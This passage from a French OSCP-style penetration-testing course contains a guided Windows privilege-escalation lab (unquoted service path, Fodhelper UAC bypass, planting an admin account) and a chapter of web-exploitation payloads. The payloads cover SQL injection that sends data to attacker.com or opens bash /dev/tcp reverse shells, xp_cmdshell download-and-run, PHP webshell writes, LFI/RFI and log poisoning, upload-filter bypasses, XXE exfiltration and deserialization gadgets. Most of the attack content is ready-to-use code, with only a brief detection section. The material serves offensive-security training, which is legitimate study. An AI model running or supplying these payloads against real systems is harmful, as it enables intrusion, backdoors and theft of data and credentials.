   - C) Registry Key Manipulation
   - D) Fodhelper Bypass

   *Réponse : D*

### Lab/Exercice guidé : PrivEsc via service vulnérable et UAC Bypass

#### Objectif
Identifier et exploiter deux vecteurs d'élévation de privilèges courants sur Windows : un service avec un chemin non cité et un contournement UAC via Fodhelper.

#### Prérequis
- Machine Windows vulnérable (ex: une VM Windows 10 ou Windows Server)
- Accès initial avec des privilèges utilisateur limités
- PowerShell disponible

#### Étapes

1. **Énumération initiale**

```powershell
# Sur la machine cible
# Vérifier l'utilisateur actuel et ses privilèges
whoami
whoami /priv

# Vérifier la version de Windows
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# Vérifier si l'utilisateur est dans le groupe Administrateurs (pour UAC Bypass)
net user %USERNAME%

# Rechercher des services avec des chemins non cités
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Analyser les résultats pour identifier un service vulnérable
# Exemple: Service "Vulnerable Service" avec chemin C:\Program Files\Vulnerable Service\service.exe
```

2. **Exploitation du service avec chemin non cité**

```powershell
# Supposons que nous avons trouvé un service vulnérable avec le chemin:
# C:\Program Files\Vulnerable Service\service.exe

# Vérifier si l'utilisateur peut écrire dans C:\Program Files\
icacls "C:\Program Files"

# Si l'utilisateur peut écrire, créer un fichier malveillant
# Créer un script PowerShell pour ajouter un utilisateur administrateur
$payload = @'
$username = "hacker"
$password = "Password123!"
$group = "Administrators"

# Créer l'utilisateur
$computer = [ADSI]"WinNT://$env:COMPUTERNAME,computer"
$user = $computer.Create("User", $username)
$user.SetPassword($password)
$user.SetInfo()

# Ajouter l'utilisateur au groupe Administrateurs
$group = [ADSI]"WinNT://$env:COMPUTERNAME/$group,group"
$group.Add("WinNT://$env:COMPUTERNAME/$username,user")

# Confirmer la création
Write-Host "User $username created and added to Administrators group."
'@

# Enregistrer le payload dans un fichier .ps1
$payload | Out-File -FilePath "$env:TEMP\payload.ps1"

# Créer un exécutable malveillant (Program.exe)
$malicious = @'
@echo off
powershell.exe -ExecutionPolicy Bypass -File "%TEMP%\payload.ps1"
'@

$malicious | Out-File -FilePath "C:\Program Files\Program.exe" -Encoding ASCII

# Redémarrer le service vulnérable
# (Nécessite que le service soit configuré pour redémarrer automatiquement ou attendre un redémarrage du système)
Restart-Service "VulnerableService" -Force

# Vérifier si l'utilisateur a été créé
net user hacker
```

3. **Exploitation du contournement UAC via Fodhelper**

```powershell
# Vérifier si l'utilisateur est dans le groupe Administrateurs mais limité par UAC
whoami /groups | findstr /i "S-1-5-32-544"
# Si "Administrators" apparaît avec "Enabled by default", "Enabled group", "Mandatory group" mais pas "Enabled", l'utilisateur est limité par UAC

# Créer les clés de registre nécessaires pour le contournement UAC
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value "cmd.exe /c powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $env:TEMP\payload.ps1" -Force

# Exécuter fodhelper.exe pour déclencher le contournement UAC
Start-Process "C:\Windows\System32\fodhelper.exe"

# Vérifier si l'utilisateur a été créé
net user hacker

# Nettoyer les clés de registre
Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force
```

4. **Vérification et utilisation des privilèges élevés**

```powershell
# Se connecter avec le nouvel utilisateur administrateur
# (Dans un nouveau terminal cmd ou PowerShell)
runas /user:hacker cmd.exe
# Entrer le mot de passe: Password123!

# Dans le nouveau terminal, vérifier les privilèges
whoami /all

# Effectuer des actions administratives
# Exemple: Ajouter un utilisateur au groupe Remote Desktop Users
net localgroup "Remote Desktop Users" %USERNAME% /add
```

5. **Nettoyage (important!)**

```powershell
# Supprimer l'utilisateur créé
net user hacker /delete

# Supprimer les fichiers malveillants
Remove-Item "C:\Program Files\Program.exe" -Force
Remove-Item "$env:TEMP\payload.ps1" -Force

# Supprimer les clés de registre (si elles n'ont pas été nettoyées)
if (Test-Path "HKCU:\Software\Classes\ms-settings") {
    Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force
}
```

#### Vue Blue Team

1. **Détection de l'exploitation du service**
   - Logs de création de fichier dans un répertoire système (C:\Program Files\)
   - Logs de redémarrage de service
   - Logs de création d'utilisateur et d'ajout au groupe Administrateurs

2. **Détection du contournement UAC**
   - Logs de modification du registre (création de clés sous HKCU:\Software\Classes\ms-settings)
   - Logs d'exécution de fodhelper.exe suivi de cmd.exe et powershell.exe
   - Logs de création d'utilisateur et d'ajout au groupe Administrateurs

#### Résultat attendu

À la fin de cet exercice, vous devriez :
- Avoir identifié un service avec un chemin non cité
- Avoir exploité cette vulnérabilité pour exécuter du code avec des privilèges élevés
- Avoir utilisé la technique de contournement UAC via Fodhelper
- Avoir créé un utilisateur administrateur et vérifié ses privilèges
- Comprendre l'importance de l'énumération pour trouver ces vecteurs
- Apprécier comment ces activités peuvent être détectées
# PARTIE III : COMPÉTENCES OSCP AVANCÉES (+ OPSEC NIVEAU 3)

## Chapitre 18 : Exploitation avancée d'applications web

### Introduction : Pourquoi ce thème est important

L'exploitation avancée d'applications web est une compétence essentielle pour tout pentester aspirant à l'OSCP. Alors que les vulnérabilités web de base comme les injections SQL simples ou les XSS sont couvertes dans les niveaux débutants, l'OSCP exige une compréhension plus approfondie des vulnérabilités complexes et de leurs chaînes d'exploitation. Ce chapitre explore les techniques avancées d'exploitation web, allant des injections SQL avancées aux désérialisations dangereuses, en passant par les techniques d'exploitation de fichiers et les vulnérabilités d'authentification. La maîtrise de ces techniques est cruciale car les applications web constituent souvent le point d'entrée principal dans une infrastructure, et leur exploitation efficace peut mener à un accès initial solide, facilitant ensuite l'élévation de privilèges et le mouvement latéral.

### Injections SQL avancées

#### Au-delà des injections basiques

1. **Injections SQL en aveugle (Blind SQL Injection)**
   - Exploitation lorsque les erreurs ne sont pas affichées et que les résultats ne sont pas directement visibles
   - Techniques basées sur le temps (Time-based) et sur les réponses booléennes (Boolean-based)
   
   ```sql
   -- Exemple d'injection booléenne
   -- Si la condition est vraie, la page s'affiche normalement
   -- Si la condition est fausse, la page s'affiche différemment ou ne s'affiche pas
   ' OR (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--
   
   -- Exemple d'injection basée sur le temps
   -- Si la condition est vraie, la requête prend du temps à s'exécuter
   ' OR (SELECT CASE WHEN (SUBSTRING(username,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE id=1)--
   ```

2. **Injections SQL de second ordre (Second-Order SQL Injection)**
   - L'injection est stockée dans la base de données et exécutée lors d'une requête ultérieure
   - Difficile à détecter car l'exploitation se produit dans un contexte différent de l'injection
   
   ```sql
   -- Première requête (stockage de l'injection)
   -- Supposons un formulaire d'inscription où le nom d'utilisateur est stocké
   -- Nom d'utilisateur malveillant: admin'; DELETE FROM users WHERE username != 'admin
   
   -- Deuxième requête (exécution de l'injection)
   -- Lorsque l'application utilise le nom d'utilisateur stocké dans une autre requête
   SELECT * FROM users WHERE username = 'admin'; DELETE FROM users WHERE username != 'admin'
   ```

3. **Injections SQL avec filtrage de caractères**
   - Contournement des filtres qui bloquent certains caractères ou mots-clés
   - Utilisation de techniques d'encodage, de concaténation et d'équivalences
   
   ```sql
   -- Contournement de filtre pour le mot-clé "UNION"
   -- Utilisation de commentaires
   UN/**/ION
   
   -- Contournement de filtre pour les guillemets simples
   -- Utilisation de la fonction CHAR() pour encoder les caractères
   SELECT CHAR(65) || CHAR(66) || CHAR(67) -- Équivalent à 'ABC'
   
   -- Contournement de filtre pour les espaces
   -- Utilisation de commentaires ou de caractères alternatifs
   SELECT/**/username/**/FROM/**/users
   SELECT(username)FROM(users)
   ```

#### Extraction avancée de données

1. **Extraction de données via UNION**
   - Techniques pour extraire des données de différentes tables et colonnes
   - Adaptation aux différents SGBD (MySQL, MSSQL, PostgreSQL, Oracle)
   
   ```sql
   -- Déterminer le nombre de colonnes
   ' UNION SELECT NULL,NULL,NULL--
   
   -- Identifier les colonnes de type string
   ' UNION SELECT 'a',NULL,NULL--
   ' UNION SELECT NULL,'a',NULL--
   ' UNION SELECT NULL,NULL,'a'--
   
   -- Extraire des informations sur la base de données
   -- MySQL
   ' UNION SELECT 1,database(),version()--
   
   -- MSSQL
   ' UNION SELECT 1,DB_NAME(),@@version--
   
   -- PostgreSQL
   ' UNION SELECT 1,current_database(),version()--
   
   -- Oracle
   ' UNION SELECT 1,SYS.DATABASE_NAME,banner FROM v$version--
   ```

2. **Extraction de données via des requêtes OUT-OF-BAND**
   - Utilisation de canaux alternatifs pour extraire des données (DNS, HTTP)
   - Particulièrement utile pour les injections aveugles
   
   ```sql
   -- MySQL (avec load_file et into outfile)
   ' UNION SELECT 1,load_file('/etc/passwd'),3 INTO OUTFILE '/var/www/html/output.txt'--
   
   -- MSSQL (avec xp_dirtree)
   '; DECLARE @q VARCHAR(8000); SET @q = (SELECT TOP 1 password FROM users WHERE username='admin'); EXEC master..xp_dirtree '\\attacker.com\share\'+@q--
   
   -- Oracle (avec UTL_HTTP)
   '; BEGIN EXECUTE IMMEDIATE 'SELECT UTL_HTTP.request(''http://attacker.com/'' || (SELECT password FROM users WHERE username=''admin'')) FROM dual'; END;--
   ```

3. **Extraction de données via des erreurs**
   - Utilisation des messages d'erreur pour extraire des informations
   - Techniques spécifiques à chaque SGBD
   
   ```sql
   -- MySQL (avec EXTRACTVALUE)
   ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users WHERE username='admin'), 0x7e))--
   
   -- PostgreSQL (avec cast)
   ' AND CAST((SELECT password FROM users WHERE username='admin') AS INTEGER)--
   
   -- MSSQL (avec conversion)
   ' AND CONVERT(INT, (SELECT TOP 1 password FROM users WHERE username='admin'))--
   
   -- Oracle (avec XMLType)
   ' AND XMLType((SELECT CONCAT('<?xml version="1.0"?><root>', password) FROM users WHERE username='admin'))--
   ```

#### Exploitation de fonctionnalités avancées des SGBD

1. **Exécution de commandes système**
   - Utilisation de fonctions spécifiques aux SGBD pour exécuter des commandes
   - Techniques pour obtenir un shell
   
   ```sql
   -- MySQL (avec INTO OUTFILE pour créer un webshell)
   ' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
   
   -- MSSQL (avec xp_cmdshell)
   '; EXEC xp_cmdshell 'powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://attacker.com/reverse.ps1'')"'--
   
   -- PostgreSQL (avec COPY TO/FROM PROGRAM)
   '; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"'--
   
   -- Oracle (avec DBMS_SCHEDULER)
   '; BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name => 'shell', job_type => 'EXECUTABLE', job_action => '/bin/bash', number_of_arguments => 3, auto_drop => TRUE); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('shell', 1, '-c'); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('shell', 2, 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('shell', 3, ''); DBMS_SCHEDULER.ENABLE('shell'); END;--
   ```

2. **Lecture et écriture de fichiers**
   - Techniques pour lire et écrire des fichiers sur le système
   - Exploitation pour obtenir des informations sensibles ou créer des backdoors
   
   ```sql
   -- MySQL (avec load_file et into outfile)
   ' UNION SELECT 1,load_file('/etc/passwd'),3--
   ' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
   
   -- PostgreSQL (avec COPY)
   '; COPY (SELECT '') TO '/tmp/test.txt'--
   '; CREATE TABLE temp(data text); COPY temp FROM '/etc/passwd'--
   
   -- MSSQL (avec BULK INSERT et OpenRowset)
   '; BULK INSERT mytable FROM 'c:\inetpub\wwwroot\web.config'--
   '; SELECT * FROM OPENROWSET(BULK 'c:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS data--
   ```

3. **Manipulation de la base de données**
   - Techniques pour modifier la structure et les données de la base
   - Exploitation pour créer des utilisateurs privilégiés ou modifier des permissions
   
   ```sql
   -- MySQL (création d'utilisateur avec privilèges)
   '; CREATE USER 'hacker'@'%' IDENTIFIED BY 'password'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%' WITH GRANT OPTION--
   
   -- MSSQL (ajout d'un utilisateur sysadmin)
   '; EXEC sp_addlogin 'hacker', 'password'; EXEC sp_addsrvrolemember 'hacker', 'sysadmin'--
   
   -- PostgreSQL (modification de rôle)
   '; ALTER USER postgres WITH PASSWORD 'newpassword'--
   
   -- Oracle (création d'utilisateur avec privilèges DBA)
   '; CREATE USER hacker IDENTIFIED BY password; GRANT DBA TO hacker--
   ```

### Exploitation de fichiers et d'inclusion

#### Inclusion de fichiers (LFI/RFI)

1. **Techniques avancées de LFI (Local File Inclusion)**
   - Contournement des filtres et restrictions
   - Exploitation des wrappers PHP
   
   ```php
   // Contournement de filtres qui ajoutent une extension
   // Si l'application ajoute .php à la fin de l'inclusion
   ?file=../../../etc/passwd%00   // Null byte (PHP < 5.3.4)
   ?file=../../../etc/passwd.    // Troncature de chemin (Windows)
   
   // Contournement de filtres qui vérifient la présence de ../
   ?file=....//....//....//etc/passwd
   ?file=..././..././..././etc/passwd
   ?file=/etc/passwd
   
   // Utilisation de wrappers PHP
   ?file=php://filter/convert.base64-encode/resource=config.php
   ?file=php://input
   // Puis envoyer du code PHP dans le corps de la requête POST
   ```

2. **Exploitation de RFI (Remote File Inclusion)**
   - Techniques pour inclure des fichiers distants
   - Contournement des restrictions
   
   ```php
   // Inclusion basique
   ?file=http://attacker.com/shell.php
   
   // Contournement de filtres qui vérifient http://
   ?file=\\attacker.com\share\shell.php  // SMB (Windows)
   
   // Utilisation de wrappers
   ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+
   // Équivalent à <?php system($_GET["cmd"]); ?>
   ```

3. **Exploitation via les logs et fichiers temporaires**
   - Utilisation des fichiers de log pour l'exécution de code
   - Exploitation des fichiers temporaires et de session
   
   ```php
   // Empoisonnement des logs Apache
   // 1. Envoyer une requête avec du code PHP dans le User-Agent
   // User-Agent: <?php system($_GET['cmd']); ?>
   // 2. Inclure le fichier de log
   ?file=../../../var/log/apache2/access.log
   
   // Exploitation des fichiers de session PHP
   // 1. Définir une variable de session contenant du code PHP
   // 2. Inclure le fichier de session
   ?file=../../../var/lib/php/sessions/sess_SESSIONID
   
   // Exploitation des fichiers temporaires
   // 1. Uploader un fichier contenant du code PHP
   // 2. Inclure le fichier temporaire
   ?file=../../../tmp/phpXXXXXX
   ```

#### Upload de fichiers malveillants

1. **Contournement des validations de type MIME**
   - Techniques pour tromper les vérifications de type de fichier
   - Modification des en-têtes et du contenu
   
   ```http
   // Modification de l'en-tête Content-Type
   Content-Disposition: form-data; name="file"; filename="shell.php"
   Content-Type: image/jpeg
   
   <?php system($_GET['cmd']); ?>
   ```

2. **Contournement des validations d'extension**
   - Techniques pour contourner les filtres d'extension
   - Utilisation d'extensions alternatives
   
   ```
   // Extensions alternatives pour PHP
   shell.php5
   shell.phtml
   shell.php.jpg
   shell.php%00.jpg (Null byte, PHP < 5.3.4)
   
   // Double extension
   shell.jpg.php
   
   // Casse mixte
   shell.PhP
   ```

3. **Contournement des validations de contenu**
   - Techniques pour cacher du code malveillant dans des fichiers valides
   - Utilisation de polyglots
   
   ```php
   // Polyglot GIF/PHP
   GIF89a<?php system($_GET['cmd']); ?>
   
   // Polyglot PNG/PHP (plus complexe)
   // Nécessite de créer un fichier PNG valide avec du code PHP caché
   
   // Polyglot JPG/PHP
   // Nécessite de créer un fichier JPG valide avec du code PHP caché
   // Exemple: utilisation de l'outil ExifTool pour injecter du code PHP dans les métadonnées
   exiftool -Comment="<?php system(\$_GET['cmd']); ?>" image.jpg
   ```

#### XXE (XML External Entity)

1. **Exploitation basique de XXE**
   - Lecture de fichiers locaux
   - Techniques pour extraire des données
   
   ```xml
   <!-- Lecture de fichier local -->
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
   <foo>&xxe;</foo>
   
   <!-- Extraction de données via erreur -->
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [
     <!ENTITY % file SYSTEM "file:///etc/passwd">
     <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
     %eval;
     %error;
   ]>
   <foo>test</foo>
   ```

2. **XXE Out-of-Band (OOB)**
   - Extraction de données via des canaux alternatifs (HTTP, FTP)
   - Contournement des restrictions
   
   ```xml
   <!-- Extraction via HTTP -->
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [
     <!ENTITY % file SYSTEM "file:///etc/passwd">
     <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
     %dtd;
   ]>
   <foo>test</foo>
   
   <!-- Contenu de evil.dtd sur le serveur attaquant -->
   <!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
   %all;
   %send;
   ```

3. **Contournement des protections**
   - Techniques pour contourner les WAF et les filtres
   - Utilisation d'encodages et de protocoles alternatifs
   
   ```xml
   <!-- Utilisation d'encodage UTF-16 -->
   <?xml version="1.0" encoding="UTF-16"?>
   <!DOCTYPE foo [
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
   <foo>&xxe;</foo>
   
   <!-- Utilisation de protocoles alternatifs -->
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [
     <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
   ]>
   <foo>&xxe;</foo>
   ```

### Désérialisation dangereuse

#### Principes de la désérialisation

1. **Comprendre la sérialisation et désérialisation**
   - Processus de conversion d'objets en chaînes et vice-versa
   - Risques de sécurité associés
   
   ```php
   // Exemple en PHP
   // Sérialisation
   $obj = new stdClass();
   $obj->data = "sensitive data";
   $serialized = serialize($obj);
   echo $serialized;
   // Output: O:8:"stdClass":1:{s:4:"data";s:14:"sensitive data";}
   
   // Désérialisation
   $unserialized = unserialize($serialized);
   echo $unserialized->data;
   // Output: sensitive data
   ```

2. **Identification des points d'entrée**
   - Cookies, paramètres POST/GET, en-têtes HTTP
   - Formats de sérialisation courants (PHP, Java, .NET, Python)
   
   ```
   // Exemples de données sérialisées dans différents langages
   
   // PHP
   O:8:"stdClass":1:{s:4:"data";s:14:"sensitive data";}
   
   // Java
   rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAACdAAEZGF0YXQADnNlbnNpdGl2ZSBkYXRheA==
   
   // .NET
   AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAAEBAAAAAIAAAAGBgAAAARkYXRhBgcAAAAOc2Vuc2l0aXZlIGRhdGEEBQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQdtZXRob2QwB21ldGhvZDEDAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyCQgAAAAJCQAAAAkKAAAABAgAAAAwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BwAAAAR0eXBlCGFzc2VtYmx5BnRhcmdldBJ0YXJnZXRUeXBlQXNzZW1ibHkOdGFyZ2V0VHlwZU5hbWUKbWV0aG9kTmFtZQ1kZWxlZ2F0ZUVudHJ5AQEBAQEBAwL/////wFFTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CgYLAAAAS21zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYMAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBg0AAAALbXNjb3JsaWIuZGxsBg4AAAAGU3lzdGVtBg8AAAAGQ29tcGFyZQkPAAAABAkAAAAvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIHAAAABE5hbWUMQXNzZW1ibHlOYW1lCUNsYXNzTmFtZQlTaWduYXR1cmUKU2lnbmF0dXJlMgpNZW1iZXJUeXBlEEdlbmVyaWNBcmd1bWVudHMBAQEBAQADCA1TeXN0ZW0uVHlwZVtdCQ8AAAAJCwAAAAkMAAAABhQAAAA+U3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5K0NvbXBhcmVTdHJpbmcGFQAAAC1JbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhYAAAAwSW50MzIgQ29tcGFyZShTeXN0ZW0uT2JqZWN0LCBTeXN0ZW0uT2JqZWN0KQgAAAAKAQoAAAAJAAAABhcAAAANU3lzdGVtLlN0cmluZwYLAAAABhgAAAAaU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MGGQAAABJTdGFydChTeXN0ZW0uU3RyaW5nKQYaAAAAJVZvaWQgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEKAAAACgAAAAYbAAAAF1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBgsAAAAGHAAAABpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwYdAAAAEVN0YXJ0KCkgaW5zdGFuY2UGHgAAABRWb2lkIFN0YXJ0KCkgaW5zdGFuY2UIAAAACgFBU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuQ29tcGFyaXNvbkNvbXBhcmVyYDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCQsAAAAKCw==
   
   // Python
   gASVNAAAAAAAAACMBWJ1aWx0lIwGb2JqZWN0lJOUfZSMBGRhdGGUjA5zZW5zaXRpdmUgZGF0YZRzh5RiLg==
   ```

3. **Gadget chains**
   - Chaînes d'objets qui, lorsqu'ils sont désérialisés, conduisent à l'exécution de code
   - Bibliothèques et frameworks vulnérables
   
   ```
   // Exemples de gadget chains connues
   
   // PHP
   // POP chain utilisant phpggc
   // https://github.com/ambionics/phpggc
   
   // Java
   // Gadget chains dans ysoserial
   // https://github.com/frohoff/ysoserial
   
   // .NET
   // Gadget chains dans ysoserial.net
   // https://github.com/pwntester/ysoserial.net
   ```

#### Exploitation en PHP

1. **Magic methods**
   - Méthodes spéciales appelées automatiquement lors de la désérialisation
   - Exploitation via `__wakeup()`, `__destruct()`, etc.
   
   ```php
   // Classe vulnérable avec une méthode magique
   class Vulnerable {
       public $command;
       
       function __destruct() {
           system($this->command);
       }
   }
   
   // Payload malveillant
   $obj = new Vulnerable();
   $obj->command = "id";
   echo serialize($obj);
   // Output: O:10:"Vulnerable":1:{s:7:"command";s:2:"id";}
   
   // Lorsque ce payload est désérialisé, la méthode __destruct() est appelée
   // et exécute la commande "id"
   ```

2. **POP chains (Property-Oriented Programming)**
   - Chaînes d'objets qui, lorsqu'ils sont désérialisés, conduisent à l'exécution de code
   - Utilisation de classes existantes dans l'application
   
   ```php
   // Exemple simplifié de POP chain
   class FileHandler {
       public $file;
       
       function __destruct() {
           file_get_contents($this->file);
       }
   }
   
   class Logger {
       public $logFile;
       public $data;
       
       function __destruct() {
           file_put_contents($this->logFile, $this->data);
       }
   }
   
   // Payload malveillant combinant les deux classes
   $logger = new Logger();
   $logger->logFile = "shell.php";
   $logger->data = "<?php system(\$_GET['cmd']); ?>";
   
   echo serialize($logger);
   // Output: O:6:"Logger":2:{s:7:"logFile";s:9:"shell.php";s:4:"data";s:29:"<?php system($_GET['cmd']); ?>";}
   ```

3. **Outils et techniques**
   - PHPGGC pour générer des gadget chains
   - Techniques pour contourner les protections
   
   ```bash
   # Utilisation de PHPGGC pour générer une gadget chain
   # Exemple avec Laravel
   phpggc Laravel/RCE1 system "id" -b
   
   # Contournement de protections
   # Si l'application vérifie le nom de la classe
   # Utilisation de PHAR pour déclencher la désérialisation
   ```

#### Exploitation en Java

1. **Vulnérabilités courantes**
   - Apache Commons Collections
   - Spring, Hibernate, etc.
   
   ```java
   // Exemple simplifié d'une vulnérabilité Apache Commons Collections
   // (Ceci est une représentation conceptuelle, pas du code exécutable)
   
   // La chaîne de gadgets utilise TransformedMap et InvokerTransformer
   // pour exécuter des commandes système lors de la désérialisation
   
   Map innerMap = new HashMap();
   innerMap.put("key", "value");
   
   InvokerTransformer transformer = new InvokerTransformer(
       "exec", 
       new Class[] {String.class}, 
       new Object[] {"calc.exe"}
   );
   
   Map outerMap = TransformedMap.decorate(
       innerMap, 
       null, 
       new Transformer[] {transformer}
   );
   
   // Créer un objet AnnotationInvocationHandler qui utilise outerMap
   // et le sérialiser
   ```

2. **Ysoserial**
   - Outil pour générer des payloads de désérialisation Java
   - Différents gadgets pour différentes bibliothèques
   
   ```bash
   # Utilisation de ysoserial pour générer un payload
   java -jar ysoserial.jar CommonsCollections1 "calc.exe" > payload.bin
   
   # Envoi du payload à l'application vulnérable
   curl -X POST --data-binary @payload.bin http://vulnerable-app/endpoint
   ```

3. **JMX et RMI**
   - Exploitation via Java Management Extensions
   - Remote Method Invocation
   
   ```bash
   # Exploitation de JMX via ysoserial
   java -jar ysoserial.jar JMXInvokerServlet "calc.exe" > payload.bin
   
   # Exploitation de RMI
   java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit localhost 1099 CommonsCollections1 "calc.exe"
   ```

#### Exploitation dans d'autres langages

1. **.NET**
   - Désérialisation JSON.NET, BinaryFormatter, etc.
   - Utilisation de ysoserial.net
   
   ```bash
   # Utilisation de ysoserial.net pour générer un payload
   ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "calc.exe"
   
   # Exploitation de JSON.NET
   ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc.exe"
   ```

2. **Python**
   - Pickle, PyYAML, etc.
   - Création de payloads malveillants
   
   ```python
   # Payload Pickle malveillant
   import pickle
   import os
   import base64
   
   class PickleRce(object):
       def __reduce__(self):
           return (os.system, ('id',))
   
   # Sérialiser et encoder en base64
   payload = base64.b64encode(pickle.dumps(PickleRce()))
   print(payload.decode())
   ```

3. **Ruby**
   - Marshal, YAML, etc.
   - Techniques d'exploitation
   
   ```ruby
   # Payload Marshal malveillant
   class Exploit
     def initialize(cmd)
       @cmd = cmd
     end
     
     def marshal_dump
       `#{@cmd}`
     end
   end
   
   # Sérialiser et encoder en base64
   require 'base64'
   payload = Base64.encode64(Marshal.dump(Exploit.new('id')))
   puts payload
   ```

### Vulnérabilités d'authentification et de session

#### Contournement d'authentification

1. **Prédiction et manipulation de jetons**
   - Analyse et prédiction de jetons faibles
   - Techniques pour manipuler les jetons
   
   ```
